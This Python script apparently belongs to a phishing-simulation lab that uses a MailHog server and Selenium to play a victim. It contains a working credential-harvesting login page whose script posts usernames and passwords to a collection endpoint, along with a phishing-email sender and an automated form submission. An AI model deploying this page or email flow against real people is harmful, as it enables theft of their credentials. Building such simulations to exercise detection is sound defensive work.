#!/usr/bin/env python3
"""
Phishing attack script - Implement real phishing email attacks
"""

import time
import requests
import subprocess
import logging
import json
from selenium import webdriver
from selenium.webdriver.firefox.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from logger_utils import log_attack_event
from scenarios.phishing.labels import deliver, exploit, credential_theft, email_opened, link_clicked, form_submitted, c2_communication

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

def create_phishing_page():
    """Create phishing page HTML"""
    return """
    <!DOCTYPE html>
    <html>
    <head>
        <title>Account Verification - Please Login</title>
        <style>
            body { font-family: Arial, sans-serif; margin: 40px; }
            .login-form { max-width: 400px; margin: 0 auto; padding: 20px; border: 1px solid #ccc; }
            input { width: 100%; padding: 10px; margin: 10px 0; box-sizing: border-box; }
            button { width: 100%; padding: 10px; background: #007cba; color: white; border: none; cursor: pointer; }
        </style>
    </head>
    <body>
        <div class="login-form">
            <h2>Account Verification</h2>
            <p>To ensure your account security, please re-verify your login information:</p>
            <form id="loginForm">
                <input type="text" id="username" placeholder="Username/Email" required>
                <input type="password" id="password" placeholder="Password" required>
                <button type="submit">Verify Account</button>
            </form>
        </div>
        <script>
            document.getElementById('loginForm').addEventListener('submit', function(e) {
                e.preventDefault();
                var username = document.getElementById('username').value;
                var password = document.getElementById('password').value;
                
                // Send credentials to collection server
                fetch('/collect', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        username: username,
                        password: password,
                        timestamp: new Date().toISOString()
                    })
                }).then(response => response.json())
                .then(data => {
                    alert('Verification successful! Your account is secure.');
                });
            });
        </script>
    </body>
    </html>
    """

def setup_browser(params):
    """Setup browser"""
    options = Options()
    if params.get("browser", {}).get("headless", True):
        options.add_argument("--headless")
    
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-dev-shm-usage")
    options.add_argument(f"--user-agent={params.get('browser', {}).get('user_agent', 'Mozilla/5.0')}")
    
    driver = webdriver.Firefox(options=options)
    driver.set_page_load_timeout(params.get("browser", {}).get("timeout", 30))
    
    return driver

def send_phishing_email(params):
    """Send phishing email"""
    try:
        # Use curl to send email to MailHog
        email_data = {
            "from": params["phishing_email"]["sender"],
            "to": ["victim@company.com"],
            "subject": params["phishing_email"]["subject"],
            "body": params["phishing_email"]["body"] + f"\n\nClick link: {params['target_link']}"
        }
        
        # Send email
        response = requests.post(
            f"{params['mail_server']['web_ui']}/api/v1/messages",
            json=email_data,
            timeout=10
        )
        
        if response.status_code == 200:
            logger.info("Phishing email sent successfully")
            log_attack_event("phishing_email_sent", {
                "subject": email_data["subject"],
                "target": email_data["to"][0]
            })
            return True
        else:
            logger.error(f"Failed to send email: {response.status_code}")
            return False
            
    except Exception as e:
        logger.error(f"Error sending phishing email: {e}")
        return False

def simulate_email_opening(params):
    """Simulate email opening and link clicking"""
    try:
        driver = setup_browser(params)
        
        # 1. Access MailHog Web UI to view emails
        mail_ui_url = params["mail_server"]["web_ui"]
        logger.info(f"Accessing email interface: {mail_ui_url}")
        driver.get(mail_ui_url)
        
        # Wait for email list to load
        WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.CSS_SELECTOR, ".messages"))
        )
        
        # 2. Click the first email (phishing email)
        logger.info("Clicking phishing email...")
        first_email = driver.find_element(By.CSS_SELECTOR, ".messages .message")
        first_email.click()
        
        # Wait for email content to load
        WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.CSS_SELECTOR, ".message-content"))
        )
        
        email_opened()
        logger.info("Successfully opened phishing email")
        
        # 3. Find and click phishing link in email
        logger.info("Looking for phishing link in email...")
        target_link = params["target_link"]
        
        # Find elements containing target link
        link_elements = driver.find_elements(By.TAG_NAME, "a")
        phishing_link = None
        
        for link in link_elements:
            href = link.get_attribute("href")
            if href and target_link in href:
                phishing_link = link
                break
        
        if phishing_link:
            logger.info("Found phishing link, preparing to click...")
            # Record click event
            link_clicked()
            log_attack_event("email_link_clicked", {"url": target_link})
            
            # Click link (will open in new window)
            phishing_link.click()
            
            # Wait for new window to open
            time.sleep(2)
            
            # Switch to new window
            windows = driver.window_handles
            if len(windows) > 1:
                driver.switch_to.window(windows[-1])  # Switch to latest opened window
                
                # Wait for phishing page to load
                WebDriverWait(driver, 10).until(
                    EC.presence_of_element_located((By.ID, "loginForm"))
                )
                
                logger.info("Successfully accessed phishing page via email link")
                return driver  # Return driver for subsequent operations
            else:
                logger.warning("New window not opened, directly accessing phishing page")
                driver.get(target_link)
                return driver
        else:
            logger.warning("Phishing link not found, directly accessing phishing page")
            driver.get(target_link)
            return driver
            
    except Exception as e:
        logger.error(f"Error simulating email opening: {e}")
        if driver:
            driver.quit()
        return None

def run(params):
    """
    Execute phishing attack
    
    Args:
        params: Scenario parameters dictionary
    """
    logger.info("Starting phishing attack...")
    deliver()
    
    try:
        # 1. Send phishing email
        logger.info("Step 1: Send phishing email")
        if not send_phishing_email(params):
            logger.error("Failed to send phishing email")
            return
        
        # 2. Simulate email opening and click phishing link
        logger.info("Step 2: Simulate email opening and click phishing link")
        driver = simulate_email_opening(params)
        if not driver:
            logger.error("Failed to simulate email opening")
            return
        
        # 3. Ensure credential collection server is running
        logger.info("Step 3: Ensure credential collection server is running")
        exploit()
        
        try:
            # Record page access event
            log_attack_event("phishing_page_accessed", {"url": params["target_link"]})
            
            # Wait for page to load
            WebDriverWait(driver, 10).until(
                EC.presence_of_element_located((By.ID, "loginForm"))
            )
            
            # Fill form
            logger.info("Filling phishing form...")
            username_field = driver.find_element(By.ID, "username")
            password_field = driver.find_element(By.ID, "password")
            
            # Simulate user input
            username_field.send_keys("test_user@company.com")
            time.sleep(1)
            password_field.send_keys("test_password123")
            time.sleep(1)
            
            # Submit form
            logger.info("Submitting phishing form...")
            submit_button = driver.find_element(By.CSS_SELECTOR, "button[type='submit']")
            submit_button.click()
            
            form_submitted()
            credential_theft()
            
            # Wait for submission to complete
            time.sleep(3)
            
            # Verify credentials were collected
            logger.info("Verifying credential collection...")
            try:
                response = requests.get(f"{params['capture_endpoint'].replace('/collect', '/credentials')}", timeout=10)
                if response.status_code == 200:
                    credentials = response.json()
                    logger.info(f"Successfully collected {credentials.get('count', 0)} credentials")
                    c2_communication()
                    log_attack_event("credentials_collected", {
                        "count": credentials.get('count', 0),
                        "credentials": credentials.get('credentials', [])
                    })
                else:
                    logger.warning("Unable to verify credential collection status")
            except Exception as e:
                logger.warning(f"Error verifying credential collection: {e}")
            
        finally:
            if driver:
                driver.quit()
        
        logger.info("Phishing attack execution completed")
        log_attack_event("phishing_attack_complete")
        
    except Exception as e:
        logger.error(f"Phishing attack execution failed: {e}")
        log_attack_event("phishing_attack_failed", {"error": str(e)})
        raise
